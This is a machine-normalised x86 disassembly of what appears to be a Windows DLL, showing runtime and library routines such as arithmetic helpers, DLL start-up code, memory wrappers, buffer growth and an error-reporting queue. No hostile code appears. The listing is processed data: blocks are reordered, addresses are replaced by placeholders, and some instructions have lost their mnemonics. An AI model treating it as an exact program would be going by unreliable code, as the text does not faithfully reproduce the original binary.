lea ecx [ ebx + eax + 0xa0 ]
mov eax [ esp + 0x18 ]
push ecx
push 0x0
push edx
push eax
call sub_1002b620
mov ecx [ esi + 0xbc ]
mov edx [ esi + 0x54 ]
neg edi
sbb edi edi
add ecx 0x8
not edi
and edi ebp
push ecx
mov ecx [ esp + 0x38 ]
lea eax [ edi + edx + 0xa0 ]
mov edx [ esp + 0x30 ]
push eax
push 0x0
push ecx
push edx
call sub_1002b650
mov eax [ esi + 0x54 ]
add esp 0x28
lea ecx [ edi + eax + 0xa0 ]
pop edi
mov [ eax + 0x5c ] ecx
mov esi [ esi + 0x54 ]
mov eax 0x1
lea edx [ ebx + esi + 0xa0 ]
pop ebx
mov [ esi + 0x60 ] edx
pop esi
pop ebp
add esp 0xc
retn
push r--data
push 0x6a
push r--data
call sub_1001f8d0
sub_1001ce70
mov eax [ esp + 0x8 ]
test eax eax
mov eax [ esp + 0x4 ]
je r-xdata
mov ecx [ eax + 0x7c ]
mov eax [ eax + 0x54 ]
mov edx [ eax + 0x40 ]
mov ecx [ eax + 0x88 ]
mov eax [ eax + 0x54 ]
mov edx [ eax + 0x48 ]
jmp r-xdata
retn
push esi
mov esi [ ecx ]
push edi
mov edi [ esi + 0x4 ]
cmp edi 0x8
pop edi
pop esi
jne r-xdata
test ecx ecx
je r-xdata
mov eax [ eax + 0x58 ]
push edx
push eax
push eax
push ecx
call sub_1001dba0
add esp 0x10
add edx 0x7
shr edx 0x3
shl edx 0x3
sub_1001cec0
mov eax 0x10
call sub_1001d0d0
mov eax [ esp + 0x1c ]
push ebx
push ebp
push esi
mov esi [ esp + 0x20 ]
push edi
test eax eax
mov ecx [ esi + 0x54 ]
je r-xdata
mov eax [ ecx + 0xd0 ]
mov edi [ ecx + 0x5c ]
mov ebx [ ecx + 0x44 ]
mov ebp [ ecx + 0x50 ]
mov eax [ ecx + 0xd4 ]
mov edi [ ecx + 0x60 ]
mov ebx [ ecx + 0x4c ]
mov ebp [ ecx + 0x54 ]
jmp r-xdata
mov ecx eax
mov edx eax
shr ecx 0x18
shr edx 0x10
mov [ esp + 0x24 ] cl
mov [ esp + 0x25 ] dl
mov ecx eax
lea edx [ esp + 0x10 ]
shr ecx 0x8
push edx
mov [ esp + 0x2a ] cl
mov [ esp + 0x2b ] al
call sub_1002aa30
mov eax [ esi + 0x80 ]
push 0x0
lea ecx [ esp + 0x18 ]
push eax
push ecx
call sub_1002aa50
mov edx [ esi + 0x7c ]
push edx
call sub_1002b5e0
push eax
lea eax [ esp + 0x28 ]
push edi
push eax
call sub_1002ab80
push ebx
lea ecx [ esp + 0x34 ]
push ebp
push ecx
call sub_1002ab80
lea edx [ esp + 0x50 ]
push 0x4
lea eax [ esp + 0x40 ]
push edx
push eax
call sub_1002ab80
mov ecx [ esp + 0x60 ]
push 0x0
lea edx [ esp + 0x4c ]
push ecx
push edx
call sub_1002aba0
add esp 0x44
lea eax [ esp + 0x10 ]
push eax
call sub_1002b000
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
sub_1001cfe0
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_1001d090
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_1001d0d0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_1001d150
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_1001d16f
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ _adjust_fdiv@IAT ]
cmp eax 0x1
mov ecx [ ecx ]
mov [ rw-data ] ecx
jne r-xdata
cmp [ rw-data ] eax
jle r-xdata
test eax eax
jne r-xdata
push 0x80
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
xor eax eax
jmp r-xdata
dec [ rw-data ]
push 0x1
pop eax
mov eax [ rw-data ]
test eax eax
je r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
push rw-data
push rw-data
mov [ rw-data ] eax
call _initterm
inc [ rw-data ]
pop ecx
pop ecx
jmp r-xdata
retn 0xc
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
push eax
call [ free@IAT ]
and [ rw-data ] 0x0
pop ecx
pop esi
mov ecx [ esi ]
test ecx ecx
je r-xdata
sub esi 0x4
jmp r-xdata
call ecx
mov eax [ rw-data ]
cmp esi eax
jb r-xdata
_start
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test esi esi
jne r-xdata
cmp esi 0x1
je r-xdata
cmp [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
jne r-xdata
push edi
push esi
push ebx
call sub_1001d16f
test eax eax
push edi
push esi
push ebx
call eax
test eax eax
je r-xdata
push edi
push esi
push ebx
call sub_10007990
cmp esi 0x1
mov [ ebp + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
push esi
push ebx
call sub_1001d16f
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
mov eax [ ebp + 0xc ]
push edi
push eax
push ebx
call sub_1001d16f
cmp [ ebp + 0xc ] 0x0
je r-xdata
and [ ebp + 0xc ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp + 0xc ] eax
sub_1001d320
push esi
push 0xb
push r--data
push 0x1c
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
push edi
mov ecx 0x7
xor eax eax
mov edi esi
[ edi ]
mov eax [ esp + 0xc ]
pop edi
mov [ esi ] eax
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
pop esi
retn
mov eax esi
pop esi
retn
push esi
call eax
add esp 0x4
test eax eax
jne r-xdata
push esi
call sub_1001d740
add esp 0x4
xor esi esi
sub_1001d370
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
push esi
call sub_1001d740
add esp 0x4
push esi
call eax
add esp 0x4
sub_1001d3a0
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push edi
mov edi [ esp + 0x1c ]
push edi
push ecx
mov ecx [ esp + 0x18 ]
push edx
push ecx
push esi
call eax
add esp 0x14
test eax eax
jle r-xdata
or eax 0xffffffff
pop esi
retn
pop edi
pop esi
retn
mov edx [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
add edx edi
add ecx eax
mov [ esi + 0x4 ] edx
mov [ esi + 0x8 ] ecx
sub_1001d3f0
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push edi
mov edi [ esp + 0x1c ]
push edi
push ecx
mov ecx [ esp + 0x18 ]
push edx
push ecx
push esi
call eax
add esp 0x14
test eax eax
jle r-xdata
or eax 0xffffffff
pop esi
retn
pop edi
pop esi
retn
mov edx [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
add edx edi
add ecx eax
mov [ esi + 0xc ] edx
mov [ esi + 0x10 ] ecx
sub_1001d480
mov eax [ rw-data ]
push esi
mov esi [ esp + 0x8 ]
test eax eax
je r-xdata
push esi
call [ rw-data ]
mov eax [ rw-data ]
add esp 0x4
test eax eax
pop esi
je r-xdata
push 0x0
push esi
call eax
add esp 0x8
retn
push 0x1
push 0x0
call eax
add esp 0x8
sub_1001d4c0
push ebx
mov ebx [ esp + 0x8 ]
xor ecx ecx
cmp ebx ecx
jg r-xdata
mov eax [ rw-data ]
push ebp
push esi
mov esi [ esp + 0x18 ]
push edi
mov edi [ esp + 0x18 ]
cmp eax ecx
mov [ rw-data ] ecx
je r-xdata
xor eax eax
pop ebx
retn
push esi
push edi
push ebx
call [ rw-data ]
mov ebp eax
mov eax [ rw-data ]
add esp 0xc
test eax eax
je r-xdata
push ecx
push esi
push edi
push ebx
push ecx
mov [ rw-data ] ecx
call eax
add esp 0x14
test ebp ebp
je r-xdata
push 0x1
push esi
push edi
push ebx
push ebp
call eax
add esp 0x14
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn
cmp ebx 0x800
jle r-xdata
mov al [ rw-data ]
mov [ ebp ] al
sub_1001d540
push ebx
mov ebx [ esp + 0xc ]
push ebp
mov ebp [ esp + 0xc ]
xor ecx ecx
push esi
cmp ebp ecx
push edi
jne r-xdata
cmp ebx ecx
jg r-xdata
cmp ebx ecx
jg r-xdata
mov eax [ rw-data ]
mov esi [ esp + 0x20 ]
mov edi [ esp + 0x1c ]
cmp eax ecx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov eax [ rw-data ]
mov esi [ esp + 0x20 ]
mov edi [ esp + 0x1c ]
cmp eax ecx
mov [ rw-data ] ecx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
push esi
push edi
push ebx
push ebp
call [ rw-data ]
mov ecx [ rw-data ]
add esp 0x10
test ecx ecx
mov [ esp + 0x18 ] eax
je r-xdata
push ecx
push esi
push edi
push ebx
push ecx
push ebp
call eax
add esp 0x18
push esi
push edi
push ebx
call [ rw-data ]
mov ebp eax
mov eax [ rw-data ]
add esp 0xc
test eax eax
je r-xdata
push ecx
push esi
push edi
push ebx
push ecx
mov [ rw-data ] ecx
call eax
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x1
push esi
push edi
push ebx
push eax
push ebp
call ecx
mov eax [ esp + 0x30 ]
add esp 0x18
test ebp ebp
je r-xdata
push 0x1
push esi
push edi
push ebx
push ebp
call eax
add esp 0x14
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn
cmp ebx 0x800
jle r-xdata
mov al [ rw-data ]
mov [ ebp ] al
sub_1001d620
push ebx
push ebp
mov ebp [ esp + 0xc ]
xor ecx ecx
push esi
cmp ebp ecx
push edi
jne r-xdata
mov esi [ esp + 0x1c ]
cmp esi ecx
jg r-xdata
mov ebp [ esp + 0x1c ]
cmp ebp ecx
jg r-xdata
mov eax [ rw-data ]
cmp eax ecx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov eax [ rw-data ]
mov esi [ esp + 0x24 ]
mov edi [ esp + 0x20 ]
cmp eax ecx
mov [ rw-data ] ecx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x20 ]
push eax
push ecx
push esi
call [ rw-data ]
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
mov edx [ esp + 0x24 ]
push ecx
push edx
mov edx [ esp + 0x28 ]
push edx
push esi
push ecx
push ebp
call eax
add esp 0x18
push esi
push edi
push ebp
call [ rw-data ]
mov ebx eax
mov eax [ rw-data ]
add esp 0xc
test eax eax
je r-xdata
push ecx
push esi
push edi
push ebp
push ecx
mov [ rw-data ] ecx
call eax
add esp 0x14
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
mov esi ebp
mov ecx eax
mov edi ebx
mov edx ecx
push eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push ebp
and ecx 0x3
[ edi ] [ esi ]
call sub_10026870
push ebp
call [ rw-data ]
mov esi [ esp + 0x28 ]
add esp 0xc
test ebx ebx
je r-xdata
push 0x1
push esi
push edi
push ebp
push ebx
call eax
add esp 0x14
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
retn
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
push 0x1
push ecx
push edx
push esi
push ebx
push ebp
call eax
add esp 0x18
cmp ebp 0x800
jle r-xdata
mov al [ rw-data ]
pop edi
mov [ ebx ] al
pop esi
mov eax ebx
pop ebp
pop ebx
retn
sub_1001d740
mov eax [ rw-data ]
push esi
mov esi [ esp + 0x8 ]
test eax eax
je r-xdata
push esi
call [ rw-data ]
mov eax [ rw-data ]
add esp 0x4
test eax eax
pop esi
je r-xdata
push 0x0
push esi
call eax
add esp 0x8
retn
push 0x1
push 0x0
call eax
add esp 0x8
sub_1001d780
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax 0x1
retn
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push ecx
mov ecx [ esp + 0x8 ]
push edx
push ecx
call eax
add esp 0xc
retn
sub_1001d7e0
mov eax [ esp + 0x18 ]
push ebx
push ebp
push esi
cmp eax 0xffffffff
push edi
jne r-xdata
xor edi edi
cmp eax edi
je r-xdata
mov ebx [ esp + 0x14 ]
xor edi edi
mov eax [ ebx + 0x8 ]
mov [ esp + 0x28 ] eax
jmp r-xdata
mov ebx [ esp + 0x14 ]
mov ecx [ esp + 0x28 ]
mov [ ebx + 0x8 ] ecx
mov [ esp + 0x28 ] 0x1
mov eax [ ebx + 0x4 ]
mov ebp [ esp + 0x18 ]
cmp eax edi
je r-xdata
mov eax [ ebx ]
cmp ebp edi
je r-xdata
mov eax [ ebx ]
cmp eax edi
je r-xdata
cmp eax edi
jne r-xdata
cmp eax edi
je r-xdata
cmp ebp edi
je r-xdata
mov ecx [ ebx ]
mov eax [ ecx + 0x4 ]
cmp eax 0x1
je r-xdata
push 0x104
push r--data
push 0x83
push 0x7b
push 0x6
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ ebx + 0x60 ]
cmp eax edi
je r-xdata
mov eax [ eax + 0x1c ]
cmp eax edi
je r-xdata
mov edx [ ebp ]
mov ecx [ eax ]
cmp edx ecx
je r-xdata
mov ecx [ ebx ]
mov ebp [ esp + 0x24 ]
mov eax [ ecx + 0x10 ]
test al 0x10
jne r-xdata
cmp eax 0x8
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax edi
je r-xdata
push eax
call sub_1001d740
add esp 0x4
mov eax [ ebx + 0x60 ]
cmp eax edi
je r-xdata
push ebx
call eax
add esp 0x4
test eax eax
je r-xdata
mov eax [ esp + 0x20 ]
cmp eax edi
jne r-xdata
and eax 0x7
cmp eax 0x4
ja r-xdata
cmp eax 0x10
je r-xdata
mov ecx 0x23
xor eax eax
mov edi ebx
[ edi ]
xor edi edi
push eax
call sub_10022640
add esp 0x4
mov ecx [ ebx ]
mov edx [ ecx + 0x20 ]
push edx
push eax
call sub_10026870
add esp 0x8
mov esi [ esp + 0x1c ]
mov eax [ esp + 0x28 ]
cmp esi edi
mov [ ebx + 0x8 ] eax
je r-xdata
mov ecx [ esp + 0x28 ]
mov edx [ ebx ]
push ecx
push ebp
push eax
push ebx
call [ edx + 0x14 ]
add esp 0x10
test eax eax
jne r-xdata
mov ecx [ ebx ]
test [ ecx + 0x10 ] 0x20
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
jmp [ eax * 4 + jump_table_1001db10 ]
push r--data
push 0x10d
push r--data
call sub_1001f8d0
mov ecx [ ebp ]
push ecx
call sub_1002f780
add esp 0x4
mov esi eax
push esi
call sub_100225b0
add esp 0x4
test eax eax
jne r-xdata
mov edx [ ebx ]
mov [ ebx + 0xc ] edi
mov [ ebx + 0x64 ] edi
pop edi
mov eax [ edx + 0x4 ]
pop esi
dec eax
pop ebp
mov [ ebx + 0x68 ] eax
mov eax 0x1
pop ebx
retn
mov [ ebx + 0x50 ] edi
cmp [ ecx + 0xc ] 0x10
jle r-xdata
mov [ ebx + 0x4 ] edi
mov edx [ ebp ]
push edx
push esi
call sub_1002f7a0
add esp 0x8
cmp eax edi
jne r-xdata
cmp esi edi
je r-xdata
push 0x9b
jmp r-xdata
cmp ebp edi
je r-xdata
push r--data
push 0x11e
push r--data
call sub_1001f8d0
mov [ ebx + 0x60 ] edi
push 0xec
push r--data
push eax
call sub_1001d4c0
add esp 0xc
cmp eax edi
mov [ ebx + 0x60 ] eax
jne r-xdata
mov ebp eax
mov [ ebx + 0x4 ] esi
jmp r-xdata
push 0xac
push r--data
push 0x86
push 0x8c
push 0x6
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx [ ebx ]
lea esi [ ebx + 0x10 ]
lea edi [ ebx + 0x20 ]
mov ecx [ ecx + 0xc ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
xor edi edi
mov edx [ ebx ]
mov esi ebp
lea edi [ ebx + 0x10 ]
mov ecx [ edx + 0xc ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
cmp eax edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x5c ] edi
mov [ ebx + 0x58 ] eax
mov eax [ ebx ]
test [ eax + 0x10 ] 0x40
je r-xdata
push 0xef
push r--data
push 0x41
push 0x7b
push 0x6
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov [ ebx ] ebp
mov eax [ ebp + 0x20 ]
cmp eax edi
je r-xdata
mov eax [ eax + 0x2c ]
cmp eax edi
jne r-xdata
push 0x168
push r--data
push 0x83
push 0x7c
push 0x6
call sub_1001de60
add esp 0x14
jmp r-xdata
push edi
push edi
push edi
push ebx
call eax
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
push 0x16d
push r--data
push 0x84
push 0x7c
push 0x6
call sub_1001de60
add esp 0x14
jmp r-xdata
push 0xfd
push r--data
push 0x86
push 0x7b
push 0x6
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
cmp eax edi
jne r-xdata
push 0x173
push r--data
push 0x85
push 0x7c
push 0x6
call sub_1001de60
add esp 0x14
jmp r-xdata
sub_1001db30
push edi
mov edi [ esp + 0x8 ]
mov eax [ edi ]
test eax eax
je r-xdata
mov eax [ edi + 0x60 ]
test eax eax
je r-xdata
mov eax [ eax + 0x1c ]
test eax eax
je r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push eax
call sub_1001d740
add esp 0x4
mov eax [ edi + 0x60 ]
test eax eax
je r-xdata
push edi
call eax
add esp 0x4
test eax eax
jne r-xdata
mov ecx 0x23
xor eax eax
[ edi ]
mov eax 0x1
pop edi
retn
push eax
call sub_10022640
add esp 0x4
mov ecx [ edi ]
mov edx [ ecx + 0x20 ]
push edx
push eax
call sub_10026870
add esp 0x8
pop edi
retn
sub_1001dbc0
mov ecx [ esp + 0x4 ]
mov eax [ ecx ]
test eax eax
jne r-xdata
mov eax [ eax + 0x2c ]
test eax eax
jne r-xdata
push 0x168
push r--data
push 0x83
push 0x7c
push 0x6
call sub_1001de60
add esp 0x14
xor eax eax
retn
mov edx [ esp + 0x10 ]
push edx
mov edx [ esp + 0x10 ]
push edx
mov edx [ esp + 0x10 ]
push edx
push ecx
call eax
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
push 0x16d
push r--data
push 0x84
push 0x7c
push 0x6
call sub_1001de60
add esp 0x14
xor eax eax
retn
retn
push 0x173
push r--data
push 0x85
push 0x7c
push 0x6
call sub_1001de60
add esp 0x14
xor eax eax
sub_1001dc60
push 0x43
push r--data
push 0xc
call sub_1001d4c0
xor ecx ecx
add esp 0xc
cmp eax ecx
jne r-xdata
mov [ eax ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] ecx
retn
push 0x46
push r--data
push 0x41
push 0x65
push 0x7
call sub_1001de60
add esp 0x14
xor eax eax
retn
sub_1001dca0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
push esi
call sub_1001d740
add esp 0x4
pop edi
mov ecx [ esi + 0x8 ]
xor eax eax
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov eax [ esi + 0x4 ]
push eax
call sub_1001d740
add esp 0x4
sub_1001dce0
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edx [ esi ]
cmp edx ebx
jge r-xdata
mov [ esi ] ebx
pop edi
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x8 ] ebx
jl r-xdata
lea ecx [ ebx + 0x3 ]
mov eax 0x55555556
imul ecx
mov eax edx
shr eax 0x1f
add edx eax
mov eax [ esi + 0x4 ]
shl edx 0x2
test eax eax
mov edi edx
jne r-xdata
mov edi [ esi + 0x4 ]
mov ecx ebx
sub ecx edx
xor eax eax
jmp r-xdata
push 0x70
push r--data
push edi
push eax
call sub_1001d540
add esp 0x10
push 0x6e
push r--data
push edi
call sub_1001d4c0
add esp 0xc
jmp r-xdata
add edi edx
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov [ esi + 0x8 ] edi
mov edi [ esi ]
mov ecx ebx
mov [ esi + 0x4 ] edx
sub ecx edi
xor eax eax
push 0x73
push r--data
push 0x41
push 0x64
push 0x7
call sub_1001de60
add esp 0x14
xor ebx ebx
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx eax
test edx edx
jne r-xdata
sub_1001dd90
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
mov edx [ ebx ]
mov esi [ esp + 0x14 ]
cmp edx esi
push edi
jl r-xdata
mov ebp [ ebx + 0x8 ]
cmp ebp esi
jl r-xdata
mov edi [ ebx + 0x4 ]
mov ecx edx
sub ecx esi
xor eax eax
add edi esi
jmp r-xdata
lea ecx [ esi + 0x3 ]
mov eax 0x55555556
imul ecx
mov eax edx
shr eax 0x1f
add edx eax
mov eax [ ebx + 0x4 ]
shl edx 0x2
test eax eax
mov edi edx
jne r-xdata
mov edi [ ebx + 0x4 ]
mov ecx esi
sub ecx edx
xor eax eax
jmp r-xdata
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov [ ebx ] esi
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x95
push r--data
push edi
push ebp
push eax
call sub_1001d620
add esp 0x14
push 0x93
push r--data
push edi
call sub_1001d4c0
add esp 0xc
jmp r-xdata
add edi edx
mov [ ebx + 0x8 ] edi
mov edi [ ebx ]
mov ecx esi
mov [ ebx + 0x4 ] edx
sub ecx edi
xor eax eax
push 0x98
push r--data
push 0x41
push 0x69
push 0x7
call sub_1001de60
add esp 0x14
xor esi esi
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn
mov edx eax
test edx edx
jne r-xdata
sub_1001de60
push esi
push edi
call sub_10030080
mov esi eax
mov eax [ esi + 0x184 ]
inc eax
and eax 0x8000000f
jns r-xdata
mov ecx [ esi + 0x188 ]
mov [ esi + 0x184 ] eax
cmp eax ecx
jne r-xdata
dec eax
or eax 0xfffffff0
inc eax
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x14 ]
xor edi edi
and ecx 0xff
mov [ esi + eax * 4 + 0x4 ] edi
mov eax [ esp + 0x10 ]
and eax 0xfff
and edx 0xfff
shl eax 0xc
shl ecx 0x18
or eax ecx
mov ecx [ esi + 0x184 ]
or eax edx
mov [ esi + ecx * 4 + 0x44 ] eax
mov edx [ esi + 0x184 ]
mov eax [ esp + 0x18 ]
mov [ esi + edx * 4 + 0x104 ] eax
mov ecx [ esi + 0x184 ]
mov edx [ esp + 0x1c ]
mov [ esi + ecx * 4 + 0x144 ] edx
mov eax [ esi + 0x184 ]
mov ecx [ esi + eax * 4 + 0x84 ]
cmp ecx edi
je r-xdata
inc ecx
and ecx 0x8000000f
jns r-xdata
mov edx [ esi + 0x184 ]
mov [ esi + edx * 4 + 0xc4 ] edi
pop edi
pop esi
retn
test [ esi + eax * 4 + 0xc4 ] 0x1
je r-xdata
mov [ esi + 0x188 ] ecx
dec ecx
or ecx 0xfffffff0
inc ecx
mov eax [ esi + 0x184 ]
mov [ esi + eax * 4 + 0xc4 ] edi
pop edi
pop esi
retn
push ecx
call sub_1001d740
mov eax [ esi + 0x184 ]
add esp 0x4
mov [ esi + eax * 4 + 0x84 ] edi
mov ecx [ esi + 0x184 ]
mov [ esi + ecx * 4 + 0xc4 ] edi
pop edi
pop esi
retn
sub_1001df60
mov eax 0x4
call sub_1001d0d0
push ebp
push esi
push edi
call sub_10030080
mov ecx eax
mov ebp 0x10
mov [ esp + 0xc ] ecx
xor edi edi
lea esi [ ecx + 0x84 ]
mov [ esi + 0x40 ] edi
mov [ esi + 0x80 ] edi
mov [ esi + 0xc0 ] 0xffffffff
add esi 0x4
dec ebp
jne r-xdata
test [ esi + 0x40 ] 0x1
je r-xdata
mov [ esi - 0x80 ] edi
mov [ esi - 0x40 ] edi
mov eax [ esi ]
cmp eax edi
je r-xdata
mov [ ecx + 0x188 ] edi
mov [ ecx + 0x184 ] edi
pop edi
pop esi
pop ebp
pop ecx
retn
push eax
call sub_1001d740
mov ecx [ esp + 0x10 ]
add esp 0x4
mov [ esi ] edi
sub_1001dfd0
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
push edx
push eax
push 0x0
push 0x1
call sub_1001e040
add esp 0x18
retn
sub_1001e040
push ebp
push esi
push edi
call sub_10030080
mov ebp [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
test ebp ebp
mov edi eax
je r-xdata
mov eax [ edi + 0x188 ]
mov esi [ edi + 0x184 ]
cmp eax esi
jne r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebp
retn
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ edi + esi * 4 + 0x44 ]
test ebp ebp
mov [ esp + 0x10 ] eax
je r-xdata
lea esi [ eax + 0x1 ]
and esi 0x8000000f
jns r-xdata
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
mov [ eax ] rw-data
mov edx [ esp + 0x18 ]
test edx edx
je r-xdata
mov [ edi + 0x188 ] esi
mov [ edi + esi * 4 + 0x44 ] 0x0
dec esi
or esi 0xfffffff0
inc esi
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
mov [ eax ] 0x0
mov ecx [ esp + 0x20 ]
test ecx ecx
jne r-xdata
mov ecx [ esp + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
mov [ eax ] rw-data
mov eax [ edi + esi * 4 + 0x84 ]
test eax eax
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ edi + esi * 4 + 0x104 ]
test eax eax
jne r-xdata
pop edi
pop esi
mov eax 0x44
pop ebp
retn
mov [ eax ] 0x0
mov [ ecx ] eax
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
mov eax [ esp + 0x24 ]
mov [ ecx ] rw-data
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
retn
mov eax [ edi + esi * 4 + 0x84 ]
test eax eax
je r-xdata
mov [ edx ] eax
mov edx [ edi + esi * 4 + 0x144 ]
mov [ ecx ] edx
mov [ edx ] r--data
mov [ ecx ] eax
jmp r-xdata
mov ecx [ edi + esi * 4 + 0xc4 ]
mov [ eax ] ecx
pop edi
mov [ eax ] 0x0
mov eax [ esp + 0xc ]
pop esi
pop ebp
retn
mov eax [ esp + 0x10 ]
mov [ edi + esi * 4 + 0xc4 ] 0x0
pop edi
pop esi
